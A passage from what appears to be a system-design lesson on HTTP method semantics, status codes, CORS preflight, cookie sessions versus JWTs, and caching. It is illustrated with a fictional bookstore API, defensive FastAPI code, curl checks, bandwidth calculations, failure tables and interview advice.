Vary: Origin                           <- essential, or your CDN caches one origin's answer for all
```

Only if that passes does the browser send the real `POST`.

Three rules that trip everyone up:

1. **`Access-Control-Allow-Credentials: true` is incompatible with `Access-Control-Allow-Origin: *`.** If you want cookies sent cross-origin, you must echo back one specific origin — and therefore you must validate it against an allowlist, not reflect whatever arrived.
2. **Always send `Vary: Origin`** when the value is computed per-request, or a shared cache will serve origin A's `Access-Control-Allow-Origin` header to origin B.
3. **Set `Access-Control-Max-Age`.** Without it, every single `POST`/`PUT` costs an extra round trip. At 80 ms RTT on an API-heavy page that is hundreds of wasted milliseconds — see §9.

## 5. Request / data flow

A BookNook user, already logged in, submits a review from the single-page app at `https://booknook.com` to the API at `https://api.booknook.com`:

1. User clicks "Submit review". JavaScript calls `fetch('https://api.booknook.com/books/1492052205/reviews', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json','X-CSRF-Token':t}, body:...})`.
2. The browser notices the target origin differs from the page origin, the method is `POST`, and `Content-Type` is `application/json` — **preflight required**.
3. Browser checks its **preflight cache** for `(origin, url, method)`. Miss on first use.
4. Browser sends `OPTIONS /books/.../reviews` with `Origin`, `Access-Control-Request-Method: POST`, `Access-Control-Request-Headers: content-type, x-csrf-token`. **No cookies, no body.**
5. API's CORS middleware checks `Origin` against its allowlist, and replies `204` with `Access-Control-Allow-*` headers, `Access-Control-Allow-Credentials: true`, `Access-Control-Max-Age: 86400`, and `Vary: Origin`.
6. Browser caches that preflight result for 24 hours and proceeds.
7. Browser sends the real `POST`, now attaching `Cookie: __Host-session=7f3a9c21b4e8` because `credentials: 'include'` was set and `SameSite=None; Secure` permits it (or `Lax` would have blocked it — a real gotcha for split-origin SPAs).
8. The API's auth middleware reads the session cookie. No cookie → `401` with `WWW-Authenticate`. Present → look up `session:7f3a9c21b4e8` in Redis (~0.4 ms) → `{user_id: 42}`.
9. CSRF middleware compares the `X-CSRF-Token` header against the token bound to the session. Mismatch → `403`.
10. Authorisation check: may user 42 review this book? Has user 42 already reviewed it? If already reviewed → **`409 Conflict`**, not 400.
11. Validation: body parses as JSON (else `400`); `rating` is 1–5 and `text` ≤ 5,000 chars (else `422`).
12. Rate limiting: user 42 has posted 3 reviews in the last minute, limit is 5. OK. If exceeded → **`429` with `Retry-After: 45`**.
13. Insert the review row. Invalidate the cached review list for that book.
14. Respond **`201 Created`** with `Location: https://api.booknook.com/reviews/8812`, a body containing the created review, `Cache-Control: no-store`, and `Access-Control-Allow-Origin: https://booknook.com`.
15. Browser checks the CORS header on the *response*, matches, and resolves the `fetch` promise. JavaScript updates the UI.
16. The SPA then re-fetches the review list with `If-None-Match: "rev-list-v17"`. Because step 13 invalidated it, the ETag changed → `200` with the new list and `ETag: "rev-list-v18"`.

## 6. ASCII diagram

```
 METHOD SEMANTICS GRID
 +----------+------+------------+----------------------------------------------+
 | Method   | Safe | Idempotent | Auto-retry on network failure?               |
 +----------+------+------------+----------------------------------------------+
 | GET      | yes  | yes        | YES - safe to replay                         |
 | HEAD     | yes  | yes        | YES                                          |
 | OPTIONS  | yes  | yes        | YES                                          |
 | PUT      | no   | yes        | YES - carries full final state               |
 | DELETE   | no   | yes        | YES - 2nd call returns 404, state identical  |
 | PATCH    | no   | depends*   | ONLY if patch is assignment, not delta       |
 | POST     | no   | NO         | NO - needs an Idempotency-Key (Lesson 17)    |
 +----------+------+------------+----------------------------------------------+
   * delta ops ("increment by 10") are NOT idempotent;
     assignment ops ("city = Pune") ARE.

 STATUS CODE DECISION TREE
                      request arrives
                            |
            +---------------+---------------+
            | can we parse / frame it?      |
            +---------------+---------------+
             no -> 400 (or 413 / 431 for size)
                            | yes
            +---------------+---------------+
            | do we know WHO the caller is? |
            +---------------+---------------+
             no -> 401 + WWW-Authenticate
                            | yes
            +---------------+---------------+
            | is this caller ALLOWED?       |
            +---------------+---------------+
             no -> 403   (or 404 to hide existence)
                            | yes
            +---------------+---------------+
            | does the resource exist?      |
            +---------------+---------------+
             no -> 404   /  deleted on purpose -> 410
                            | yes
            +---------------+---------------+
            | is the body business-valid?   |
            +---------------+---------------+
             no -> 422   /  conflicts with state -> 409
                            | yes
            +---------------+---------------+
            | over quota?                   |
            +---------------+---------------+
             yes -> 429 + Retry-After
                            | no
                        DO THE WORK
                            |
        created -> 201 + Location | queued -> 202 | nothing to return -> 204 | else 200
                            |
         we crashed -> 500 | upstream garbage -> 502 | shedding -> 503 | too slow -> 504

 CORS PREFLIGHT (cross-origin POST with JSON)
   page https://booknook.com          api https://api.booknook.com
          |                                        |
          |  OPTIONS /orders                       |
          |  Origin: https://booknook.com          |
          |  Access-Control-Request-Method: POST   |
          | -------------------------------------> |
          |  204 No Content                        |
          |  Access-Control-Allow-Origin: https://booknook.com
          |  Access-Control-Allow-Methods: POST    |
          |  Access-Control-Max-Age: 86400         |
          | <------------------------------------- |
          |                                        |
          |  POST /orders  (+ Cookie, + body)      |   <- only now does the
          | -------------------------------------> |      real request go
          |  201 Created + Access-Control-Allow-Origin
          | <------------------------------------- |
   NOTE: without Access-Control-Max-Age, the OPTIONS repeats on EVERY call.

 CACHE DECISION
   client has a copy
        |
        +-- within max-age?  --yes--> use it, ZERO network (saves latency + bytes)
        |
        +-- stale -----------------> conditional GET (If-None-Match)
                                        |
                                        +-- 304 -> use local copy (saves BYTES only,
                                        |          still costs one full round trip)
                                        +-- 200 -> new body + new ETag
```

## 7. Detailed example

### BookNook: the checkout and account endpoints

**Correct method and code choices across BookNook's API:**

| Operation | Method + path | Success code | Notes |
|---|---|---|---|
| View a book | `GET /books/{isbn}` | `200` / `304` | `Cache-Control: public, max-age=300`, ETag |
| Search | `GET /search?q=` | `200` | `private, max-age=0` — personalised ranking |
| Add to cart | `PUT /cart/items/{isbn}` with `{"quantity":2}` | `200` | **`PUT`, not `POST`** — "set quantity to 2" is idempotent; a double-tap on mobile cannot add 4 books |
| Remove from cart | `DELETE /cart/items/{isbn}` | `204` | Second call also `204` or `404`; state identical |
| Place order | `POST /orders` + `Idempotency-Key` | `201` + `Location` | Not idempotent by nature; the key makes retries safe |
| Order being processed asynchronously | `POST /orders` | `202` + `Location: /orders/9f3b/status` | Honest about "not done yet" (Lesson 13) |
| Update profile | `PATCH /users/me` `{"city":"Pune"}` | `200` | Assignment-style patch → idempotent |
| Out-of-stock at checkout | `POST /orders` | **`409 Conflict`** | Not 400 — the request was well-formed, the *state* conflicts |
| Rating of 9 on a 1–5 scale | `POST /reviews` | **`422`** | Parsed fine, semantically invalid |
| Book permanently delisted | `GET /books/{isbn}` | **`410 Gone`** | Tells Google to drop the URL; a 404 would be retried for months |
| Deploy in progress, no healthy pods | any | **`503` + `Retry-After: 20`** | Never 500 — this is not a bug, it is unavailability |

**The checkout exchange, in full:**

```
POST /api/orders HTTP/1.1
Host: api.booknook.com
Origin: https://booknook.com
Content-Type: application/json
Content-Length: 46
Cookie: __Host-session=7f3a9c21b4e8
X-CSRF-Token: 5d2f91ab0c7e4f36
Idempotency-Key: 0f9b2a7c-4e5d-4a19-9f2b-1c0a6d8e3b11

{"items":[{"isbn":"1492052205","quantity":2}]}
```

```
HTTP/1.1 201 Created
Location: https://api.booknook.com/orders/9f3b2c
Content-Type: application/json
Cache-Control: no-store
Set-Cookie: cart_count=0; Path=/; Secure; SameSite=Lax; Max-Age=0
Access-Control-Allow-Origin: https://booknook.com
Access-Control-Allow-Credentials: true
Vary: Origin

{"order_id":"9f3b2c","total_paise":640000,"status":"confirmed"}
```

Note `Cache-Control: no-store` (an order confirmation must never sit in a shared cache), `Max-Age=0` to clear the cart-count cookie, and `Vary: Origin` so a CDN cannot cross-serve CORS headers.

### Contrasting example: a public weather API with API-key auth

Same HTTP primitives, completely different configuration — and the contrast teaches the rules.

```
GET /v1/forecast?lat=18.52&lon=73.86 HTTP/1.1
Host: api.weather.example
Authorization: Bearer wk_live_8f2b...        <- header auth, NOT a cookie
```

```
HTTP/1.1 200 OK
Cache-Control: public, max-age=600, s-maxage=1800, stale-while-revalidate=300
ETag: "pune-20261008-1700"
Access-Control-Allow-Origin: *               <- safe here: no cookies involved
RateLimit-Limit: 1000
RateLimit-Remaining: 847
RateLimit-Reset: 1760001600
Vary: Accept-Encoding
```

| | BookNook API | Weather API |
|---|---|---|
| Auth carrier | Cookie (`__Host-`, `HttpOnly`, `SameSite`) | `Authorization` header |
| CSRF risk | **Real** — cookies auto-attach; needs tokens + SameSite | **None** — nothing is sent automatically |
| XSS risk to the token | Lower (`HttpOnly` hides it from JS) | Higher if stored in `localStorage` |
| CORS | Specific origin + `Allow-Credentials: true` | `*` is acceptable because credentials are never auto-sent |
| Caching | `private` / `no-store` — per-user data | `public, s-maxage=1800` — same answer for everyone in Pune |
| Rate limit response | `429` + `Retry-After` | `429` + `RateLimit-*` headers on every response |
| `410` usage | Delisted books | Retired API versions |

The transferable insight: **cookie auth and header auth have mirror-image threat models.** Cookies give you CSRF exposure and XSS protection; bearer tokens in JS give you XSS exposure and CSRF immunity. Choose deliberately and then mitigate the side you chose.

## 8. Code or configuration example

**This code illustrates the concepts and is not production-ready** — real apps should use a framework's built-in session, CSRF, and CORS middleware rather than hand-rolling any of it.

```python
import secrets, hashlib, time
from fastapi import FastAPI, Request, Response, HTTPException, Header

app = FastAPI()
redis = ...   # assume a Redis client; sessions live here, NOT in process memory (Lesson 2)

SESSION_TTL = 14 * 24 * 3600          # 14 days
ALLOWED_ORIGINS = {"https://booknook.com", "https://www.booknook.com"}


@app.post("/login")
def login(resp: Response, email: str, password: str):
    user = authenticate(email, password)
    if not user:
        # 401 = "we don't know who you are". NOT 403, and deliberately vague:
        # saying "wrong password" confirms the email exists (account enumeration).
        raise HTTPException(401, "invalid credentials",
                            headers={"WWW-Authenticate": 'Cookie realm="booknook"'})

    # 128+ bits of CSPRNG randomness. NEVER a sequential id, a hash of the email,
    # or anything guessable -- the whole security of the session is this value.
    sid = secrets.token_urlsafe(32)
    csrf = secrets.token_urlsafe(24)
    redis.setex(f"session:{sid}", SESSION_TTL,
                json.dumps({"user_id": user.id, "csrf": csrf, "iat": int(time.time())}))

    # __Host- prefix: the BROWSER enforces Secure + Path=/ + no Domain attribute.
    # HttpOnly: JS cannot read it, so an XSS cannot exfiltrate the raw token.
    # SameSite=Lax: not sent on cross-site POST -> blocks the classic CSRF shape.
    # No Domain attribute => host-only cookie => a hacked blog.booknook.com
    # subdomain does NOT receive this session cookie.
    resp.set_cookie("__Host-session", sid, max_age=SESSION_TTL,
                    path="/", secure=True, httponly=True, samesite="lax")

    # The CSRF token is intentionally readable by JS so the SPA can echo it back
    # in a header. evil.com cannot read it (same-origin policy), so it cannot forge.
    resp.set_cookie("csrf", csrf, max_age=SESSION_TTL,
                    path="/", secure=True, httponly=False, samesite="lax")
    return {"ok": True}


def current_user(request: Request):
    sid = request.cookies.get("__Host-session")
    if not sid:
        raise HTTPException(401, "not authenticated")      # unauthenticated -> 401
    raw = redis.get(f"session:{sid}")                       # ~0.4ms lookup
    if raw is None:
        raise HTTPException(401, "session expired")         # still 401, still 401
    return json.loads(raw)


@app.post("/reviews")
def create_review(request: Request, resp: Response, book_isbn: str, rating: int,
                  x_csrf_token: str = Header(None),
                  idempotency_key: str = Header(None)):
    sess = current_user(request)

    # CSRF check: compare the header the SPA sent against the session-bound token.
    # secrets.compare_digest avoids leaking information through timing.
    if not x_csrf_token or not secrets.compare_digest(x_csrf_token, sess["csrf"]):
        raise HTTPException(403, "csrf token mismatch")     # authenticated but refused -> 403

    # 422: the JSON parsed fine, but it is semantically invalid.
    if not 1 <= rating <= 5:
        raise HTTPException(422, "rating must be between 1 and 5")

    # 409: the request is perfectly well-formed; the STATE conflicts.
    if review_exists(sess["user_id"], book_isbn):
        raise HTTPException(409, "you have already reviewed this book")

    review = insert_review(sess["user_id"], book_isbn, rating)

    # 201 MUST carry Location pointing at the thing that was created.
    resp.status_code = 201
    resp.headers["Location"] = f"/reviews/{review.id}"
    resp.headers["Cache-Control"] = "no-store"              # never cache user-specific writes
    return review


@app.get("/books/{isbn}")
def get_book(isbn: str, if_none_match: str = Header(None)):
    book = db.fetch_book(isbn)
    if book is None:
        raise HTTPException(404, "not found")
    if book.delisted:
        # 410 tells crawlers and caches to DROP the URL permanently; 404 does not.
        raise HTTPException(410, "permanently delisted")

    # ETag derived from the row version -> changes exactly when the data changes.
    etag = '"' + hashlib.sha256(f"{book.id}:{book.updated_at}".encode()).hexdigest()[:16] + '"'

    if if_none_match == etag:
        # 304 carries NO body. Saves bandwidth, but still costs one full round trip.
        return Response(status_code=304, headers={"ETag": etag,
                                                  "Cache-Control": "public, max-age=300"})

    return Response(
        content=json.dumps(book.as_dict()),
        media_type="application/json",
        headers={
            "ETag": etag,
            # public: shared caches/CDN may store it. max-age: browser freshness.
            # s-maxage: CDN keeps it longer than the browser does.
            # stale-while-revalidate: serve stale instantly, refresh in background.
            "Cache-Control": "public, max-age=300, s-maxage=3600, stale-while-revalidate=60",
            "Vary": "Accept-Encoding",
        },
    )
```

CORS configured deliberately rather than with a wildcard:

```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    # NEVER "*" together with credentials -- the browser rejects that combination,
    # and reflecting an arbitrary Origin turns CORS into a hole.
    allow_origins=list(ALLOWED_ORIGINS),
    allow_credentials=True,          # permits cookies on cross-origin requests
    allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE"],
    allow_headers=["Content-Type", "X-CSRF-Token"],
    # Cache the OPTIONS preflight for 24h. Without this, EVERY POST costs an
    # extra round trip -- see the numbers in section 9.
    max_age=86400,
)
```

Verify behaviour from the command line:

```bash
# Observe a preflight. Note: no cookies and no body are sent on OPTIONS.
curl -i -X OPTIONS https://api.booknook.com/reviews \
  -H 'Origin: https://booknook.com' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: content-type,x-csrf-token'

# Prove CORS is browser-side only: curl gets a 200 regardless of Origin.
curl -i https://api.booknook.com/books/1492052205 -H 'Origin: https://evil.com'

# Watch an ETag turn into a 304 on the second call.
ETAG=$(curl -sI https://api.booknook.com/books/1492052205 | awk -F': ' '/^ETag/{print $2}' | tr -d '\r')
curl -i -H "If-None-Match: $ETAG" https://api.booknook.com/books/1492052205
```

## 9. Numerical example

**Goal:** quantify (a) session storage for server-side sessions vs JWT wire cost, and (b) the cost of a missing `Access-Control-Max-Age`, and (c) the bandwidth saved by ETags.

**Assumptions (stated explicitly, all typical/approximate):**
- 2,000,000 registered BookNook users; **12 % log in during any 14-day window** → active sessions.
- Session record in Redis: `user_id`, roles, CSRF token, timestamps, device info ≈ **400 bytes**, plus ~90 bytes of Redis key and object overhead → **490 bytes** per session.
- Session cookie on the wire: name + value + separators ≈ **48 bytes**.
- Equivalent JWT: header 36 B + claims 310 B + signature 43 B + two dots + `Authorization: Bearer ` prefix ≈ **610 bytes**.
- Peak traffic: **9,000 requests/second**, of which **70 %** are authenticated.
- A typical SPA page issues **34 API calls**, of which **9 are non-simple** (JSON `POST`/`PUT`/`PATCH`/`DELETE`) and would each need a preflight.
- Browser RTT to the API: **80 ms**. A preflight costs 1 RTT (connection already open).
- 5,000,000 page views/day.
- Of the 34 API calls, **20 are cacheable `GET`s** averaging **9 KB** compressed; a `304` response is **260 bytes**.
- Measured revalidation hit rate (content unchanged): **75 %**.

**Part A — session store sizing**

```
Active sessions = 2,000,000 x 0.12            = 240,000 sessions
Redis memory    = 240,000 x 490 B             = 117,600,000 B
                = 117,600,000 / 1,048,576     = 112.2 MiB
```

**112 MiB.** That fits in the smallest managed Redis instance available. The common objection "server-side sessions don't scale" is quantitatively wrong at this size — you would need **~17.9 million** concurrent sessions before hitting 8 GiB. State the number; do not argue from vibes.

**Part B — wire cost, session cookie vs JWT**

```
Authenticated requests/sec = 9,000 x 0.70 = 6,300 req/s

Cookie:  6,300 x 48 B  =   302,400 B/s  = 0.30 MB/s
JWT:     6,300 x 610 B = 3,843,000 B/s  = 3.84 MB/s
Extra cost of JWT      = 3,540,600 B/s  = 3.54 MB/s
```

Per day:

```
3,540,600 B/s x 86,400 s = 305,907,840,000 B/day
                         = 305,907,840,000 / 1e9 = 305.9 GB/day
                         = 111,654 GB/year  (305.9 x 365)
```

At ₹0.80/GB of egress-equivalent transfer, **₹89,323/year** in extra bytes — plus the upload bandwidth cost on *mobile* users, which they pay. Against that, JWT saves 6,300 Redis lookups/second.

```
Redis lookup cost = 6,300 req/s x 0.4 ms = 2.52 seconds of Redis time per second
                  => needs ~3 cores' worth of Redis capacity (approximate)
```

**The real decision:** 112 MiB of RAM and ~3 cores of Redis, versus 306 GB/day of extra bytes and the inability to revoke a token. For a single-organisation web app, server-side sessions win clearly. For a federated, multi-service, mobile-heavy platform where a central session store would be a cross-region dependency, JWTs win. That is what "it depends" actually depends on: **revocation requirements, number of independent verifying services, and whether a shared low-latency store is available in every region.**

**Part C — the cost of a missing `Access-Control-Max-Age`**

Without preflight caching, each of the 9 non-simple calls costs an extra RTT:

```
Extra latency per page = 9 preflights x 80 ms = 720 ms
```

If 4 of them can run in parallel across the browser's connections:

```
Serialised waves = ceil(9 / 4) = 3 waves
Added wall-clock = 3 x 80 ms = 240 ms per page load
```

With `Access-Control-Max-Age: 86400`:

```
Preflights on the first page view of the day = 9
Preflights on every subsequent page view     = 0
If a user views 12 pages/day:
   without cache: 12 x 9 = 108 preflights
   with cache:            9 preflights
   reduction = 99 / 108 = 91.7 %
```

And in request volume:

```
Daily preflight requests, uncached = 5,000,000 page views x 9 = 45,000,000 req/day
                                   = 45,000,000 / 86,400      = 520.8 req/s of pure OPTIONS
```

**520 extra requests/second — 5.8 % of peak capacity — doing nothing but answering "yes, you may."** One header removes essentially all of it.

**Part D — ETag bandwidth savings**

```
Cacheable GETs per day = 5,000,000 page views x 20 = 100,000,000 requests/day

Without revalidation (always 200):
   100,000,000 x 9 KB = 900,000,000 KB = 900 GB/day

With conditional requests at a 75 % unchanged rate:
   304 responses = 100,000,000 x 0.75 = 75,000,000 x 260 B =  19,500,000,000 B = 19.5 GB
   200 responses = 100,000,000 x 0.25 = 25,000,000 x 9 KB  = 225,000,000 KB    = 225 GB
   Total                                                                       = 244.5 GB/day

Saving = 900 - 244.5 = 655.5 GB/day  = 72.8 % of bytes
Annual = 655.5 x 365 = 239,257 GB -> at Rs 0.80/GB = Rs 191,406/year
```

**But note what was *not* saved: latency.** All 100,000,000 requests still made a full round trip. If instead you set `Cache-Control: max-age=300` on the 60 % of those GETs that are genuinely static for five minutes:

```
Requests eliminated entirely = 100,000,000 x 0.60 = 60,000,000/day
Latency saved per eliminated request = 80 ms (one full RTT)
Server load removed = 60,000,000 / 86,400 = 694 req/s  (7.7 % of peak)
```

**Freshness beats validation.** ETags save bytes; `max-age` saves bytes *and* latency *and* server capacity. Reach for `max-age` first, and use ETags for the content you cannot safely pin.

## 10. Trade-offs

**Advantages of using HTTP semantics properly**
- **Free infrastructure behaviour**: correct methods and cache headers make CDNs, proxies, and client libraries do the right thing without any custom code.
- **Safe automatic retries**: declaring idempotency lets load balancers and service meshes retry transparently, which directly improves availability (Lesson 15).
- **Debuggability**: a status-code breakdown in your dashboard tells you *what kind* of broken you are in seconds.
- **Interoperability**: any client library already understands `401` → refresh token, `429` → back off, `304` → use cache.
- **Cookies give you automatic, transparent identity** with zero client code.

**Disadvantages and costs**
- **Semantics are advisory, not enforced.** Nothing stops you writing a `GET` that deletes. Discipline is the only mechanism.
- **Cookies are replayed on every request**, costing bytes and enabling CSRF.
- **Status-code edge cases are genuinely debated** (400 vs 422, 403 vs 404) and inconsistency across a large API is a real tax on integrators.
- **CORS is operationally fiddly**: it fails in the browser, not the server, so the error message you get ("blocked by CORS policy") never says which header was wrong.
- **Caching is the second hardest problem in computing**: stale user-specific data served from a shared cache is a severe privacy incident, not a performance bug.

**Operational costs**
- Session stores need to be highly available; if Redis is down, *every* authenticated request 500s unless you plan for it.
- Cookie attribute changes (`SameSite`) have broken real production login flows across browser releases; they need testing on each major browser.
- Cache invalidation needs an owner. Every `Cache-Control: max-age=86400` is a 24-hour commitment you cannot revoke for already-served responses.

## 11. Failure scenarios

| Failure | What the user experiences | How it's detected | How it recovers |
|---|---|---|---|
| A state-changing action implemented as `GET` | Items silently deleted; "I didn't click anything" tickets. Browser prefetchers, link-preview bots, and antivirus scanners trigger it | Mutations in the audit log with no corresponding user click; spikes correlated with crawler user-agents | Change to `POST`/`DELETE`; add `robots.txt` and `Cache-Control: no-store` as a stopgap; audit for damage |
| Missing `Secure` on the session cookie | Nothing visible — the session token is silently sent in plaintext on any `http://` request | TLS-less request logs on port 80 containing `Cookie:`; a security scan | Add `Secure` (and `__Host-` prefix); **rotate every session**, because existing tokens may already be compromised |
| Missing `HttpOnly` plus an XSS bug | Account takeover; orders the user never placed | Sessions used from an unexpected IP/ASN; anomalous logins | Add `HttpOnly` + CSP; fix the XSS; invalidate all sessions; force re-login |
| `Access-Control-Allow-Origin: *` with credentials | The SPA breaks entirely — the browser refuses the response | Browser console "credentials flag is true but Allow-Origin is '*'"; 100 % failure on cross-origin calls | Echo one allowlisted origin; add `Vary: Origin` |
| Missing `Vary: Origin` behind a CDN | Users from origin A randomly get origin B's CORS header → intermittent, unreproducible CORS failures | CORS error rate that varies by edge PoP; cache-hit responses with the wrong Allow-Origin | Add `Vary: Origin`; purge the CDN cache |
| Private response cached as `public` | **User A sees user B's order history.** A reportable data incident | Support reports; a cache-hit on a URL that should never be shared | Immediately purge the CDN; set `Cache-Control: private, no-store`; conduct an incident review |
| JWT with no revocation path, token leaked | Attacker retains access for the full token lifetime even after a password reset | Impossible to detect from the token alone; requires behavioural anomaly detection | Short `exp` (5–15 min) + refresh tokens checked against a DB; emergency key rotation invalidates *everyone* |
| Redis session store unavailable | Every logged-in user is logged out; `500`s across the site | Auth error rate to 100 %; Redis health check failing | Redis replica failover; serve read-only anonymous browsing in degraded mode; circuit breaker (Phase 4, Topic 14) |
| `429` returned without `Retry-After` | Clients retry immediately and tightly, amplifying the overload into an outage | Retry storm visible as a near-vertical request-rate spike after limiting begins | Always send `Retry-After`; implement exponential backoff with jitter in clients (Lesson 17) |
| `500` returned for overload instead of `503` | Error dashboards blame application bugs; on-call hunts a non-existent exception | 500 rate rising with CPU/queue depth but no new exception types in logs | Return `503 + Retry-After` from the load shedder; alert on saturation metrics |
| A wrong `301` redirect cached by browsers | Users are permanently redirected to a dead URL; clearing the cache is the only fix, and you cannot do it for them | Traffic to the old URL vanishes; support reports from specific users | Use `302`/`307` while uncertain; serve a working response at the redirect target; wait out the cache |

## 12. Alternatives

| Mechanism | Alternative to | Strengths | Weaknesses | Use when |
|---|---|---|---|---|
| **Cookie + server-side session** | JWT | Instant revocation, tiny on the wire, opaque | Needs a shared store; CSRF exposure | Browser apps, single organisation |
| **JWT in `Authorization` header** | Cookie session | No lookup, no CSRF, works across independent services | Large, unrevocable, claims readable | Mobile, federated identity, service-to-service |
| **Opaque token + introspection endpoint** | JWT | Revocable *and* header-based | One network call per validation | OAuth deployments needing revocation |
| **mTLS client certificates** | Bearer tokens | Strong, transport-level identity; no token to steal | Certificate distribution and rotation are painful | Service-to-service inside a mesh (Lesson 7) |
| **`SameSite` cookies** | CSRF tokens | Zero application code; browser-enforced | Older browsers; breaks some legitimate cross-site flows | Default for all new cookie-auth apps |
| **CSRF double-submit token** | `SameSite` | Works on all browsers, explicit | Extra code; must be bound to the session | Defence in depth alongside `SameSite` |
| **ETag revalidation** | `max-age` freshness | Always correct, never stale | Still one RTT per request | Content that must never be stale |
| **`Cache-Control: max-age`** | ETag | Eliminates the request entirely | Cannot be revoked once served | Static, versioned, or tolerably-stale content |
| **Content-hashed URLs + `immutable`** | Both | Perfect caching with instant invalidation (new URL) | Requires a build pipeline | All static JS/CSS/images |
| **GraphQL / gRPC error objects** | HTTP status codes | Rich, typed, structured errors | Intermediaries can no longer understand failures | Internal APIs (Lessons 11–12) |

## 13. When to use it

1. **Use `PUT` for "set this to exactly X" operations.** Cart quantities, profile replacement, feature flags. The payoff is that a flaky mobile network can retry freely without creating duplicates — the most common real-world bug class this prevents.
2. **Use `202 Accepted` whenever work is queued rather than completed.** Order processing, report generation, video encoding. Returning `200` for queued work is a lie that pushes a polling problem onto the client with no status URL to poll.
3. **Use cookie sessions for browser-first products in one organisation.** You get instant revocation, 48-byte overhead, and `HttpOnly` protection. Add `SameSite=Lax` and you have CSRF largely handled.
4. **Use `ETag` + `If-Match` for any multi-writer resource.** Collaborative editing, admin panels, inventory adjustments. `412 Precondition Failed` is far better than a silent lost update.
5. **Use `Cache-Control: public, max-age=31536000, immutable` with content-hashed filenames** for every static asset. It is the single highest-ROI header in web performance.
6. **Use `429` + `Retry-After` + `RateLimit-*` headers** on any public API. It converts hostile retry storms into orderly backoff.

## 14. When *not* to use it

1. **Don't use `PUT` when the server assigns the identifier.** `PUT` means "create or replace the resource *at this exact URL*". If the client doesn't know the URL yet because the server generates the ID, `POST` to a collection and return `201 Location` instead.
2. **Don't use cookies for a pure mobile or service-to-service API.** There is no browser to enforce `SameSite`, no automatic replay to benefit from, and cookie-jar handling in native HTTP clients is awkward. Use `Authorization: Bearer`.
3. **Don't use JWTs when you need immediate, reliable revocation** — banking session termination, "log out all devices", compliance-driven access removal. Any denylist you add reintroduces the lookup JWTs were meant to avoid, so you get the costs of both designs.
4. **Don't rely on CORS as a security boundary.** It protects *browser users of other sites* from reading your data; it does nothing against `curl`, a script, or a compromised server. Authorise every request server-side regardless of `Origin`.
5. **Don't use `304`/ETags as your latency strategy.** They save bytes, not round trips. If the problem is latency, you need freshness lifetimes, a CDN, or prefetching (Phase 2, Topic 14).
6. **Don't use `200` with an error payload** (`{"status":"error"}` inside a `200`). It makes every monitor, retry policy, and alert in your stack blind to failures. This is the most consequential status-code mistake in practice.

## 15. Common mistakes

**Beginner mistakes**
- Using `POST` for everything, forfeiting caching, safe retries, and any meaningful CDN behaviour.
- Returning `200 OK` with `{"error": "..."}` in the body — invisible to every monitoring tool you own.
- Confusing `401` and `403`, producing login redirect loops for users who *are* logged in but lack permission.
- Storing the user ID directly in a cookie (`user_id=42`) and trusting it — anyone edits it to `43`.
- Setting `Access-Control-Allow-Origin: *` to "fix CORS", then being unable to send credentials.
- Believing CORS blocks the request. It does not: the request executed; only the *response read* was blocked.
- Using `no-cache` thinking it means "do not cache" (it means "revalidate before use"); `no-store` is the one you wanted.
- Putting a 3 KB JWT in a cookie and sending it on every image request.

**Experienced-engineer mistakes**
- Returning `500` for overload instead of `503 + Retry-After`, which both misleads on-call and prevents correct client backoff.
- Omitting `Vary: Origin` or `Vary: Cookie` on responses that vary by them, risking cross-user cache poisoning — a privacy incident, not a perf bug.
- Issuing `301` redirects during an experiment; they are cached essentially forever by browsers and cannot be recalled.
- Setting `Domain=.company.com` on a session cookie, so every subdomain — including the marketing CMS run by a vendor — receives it.
- Choosing JWTs for a single-app monolith to "avoid session storage", then adding a Redis denylist for logout, ending up with both costs and neither benefit.
- Forgetting `Access-Control-Max-Age`, doubling the request count for every mutating call (§9 Part C).
- Implementing `PATCH` with delta semantics and then enabling automatic retries, silently double-incrementing values on every network blip.
- Treating `4xx` as a reliability signal and paging on it; scanners and bots will guarantee you never sleep.
- Caching an authenticated response at the CDN because `Cache-Control` was copied from a public endpoint.

## 16. Interview perspective

This material appears in interviews as *precision*. Everyone knows `404`; few can draw the 401/403 boundary or justify `PUT` over `POST` with a retry argument.

- **Lead with idempotency when designing any write path.** "Add-to-cart is `PUT /cart/items/{isbn}` with the quantity, so a double-tap on a flaky mobile connection can't add two copies." This single sentence demonstrates method semantics, retry safety, and mobile awareness simultaneously.
- **Be exact about 401 vs 403.** Say: "401 means we don't know who you are — refresh the token. 403 means we know and you still can't — don't retry. And for sensitive resources I'd return 404 instead of 403 so existence isn't leaked."
- **Know the 502/503/504 triage.** When an interviewer says "users report errors", asking "502, 503, or 504?" immediately narrows the cause to crashed app, deliberate shedding, or slow dependency.
- **Quantify the session/JWT decision.** "240,000 active sessions at ~490 bytes is 112 MiB of Redis. JWTs would add ~3.5 MB/s of header traffic and remove revocation. For a single-org browser app I'd take the 112 MiB." Numbers end the debate.
- **State the CORS truth plainly.** "CORS is browser-enforced; it isn't an authorisation mechanism. I still authorise every request server-side." Then mention `Access-Control-Max-Age` as a latency optimisation — almost nobody does.
- **Separate freshness from validation when asked about caching.** "`max-age` removes the request; `ETag` only removes the body. If latency is the problem, I need the first."
- **Mention `Retry-After` on both 429 and 503.** It connects status codes to Lesson 17's backoff and shows you think about client behaviour, not just server responses.

**Red flags interviewers watch for**
- Saying "POST is more secure than GET" (both are plaintext without TLS; GET merely leaks parameters into logs, history, and `Referer`).
- Being unable to explain idempotency, or claiming `POST` is idempotent.
- Suggesting a `GET` endpoint that deletes or mutates data.
- Thinking CORS protects the server.
- Proposing JWTs with no answer to "how do I log someone out right now?"
- Treating `no-cache` and `no-store` as synonyms.
- Storing a session token in `localStorage` without acknowledging the XSS exposure trade-off.
- Returning `200` for failures, or `500` for rate limiting.
- Never mentioning cookie attributes when designing authentication.

## 17. Knowledge check

**Conceptual**

1. Explain precisely why `DELETE` is considered idempotent even though the second call typically returns `404`, and then explain the exact condition under which a `PATCH` endpoint *is* idempotent and the exact condition under which it is not. Give a concrete BookNook example of each.
2. A BookNook engineer says: "We added `Access-Control-Allow-Origin: *` to our API, so now anyone can read our data — that's a security hole we need to close with CORS." Identify every incorrect assumption in that sentence, explain what CORS actually protects and who enforces it, and state what the *real* control should be.
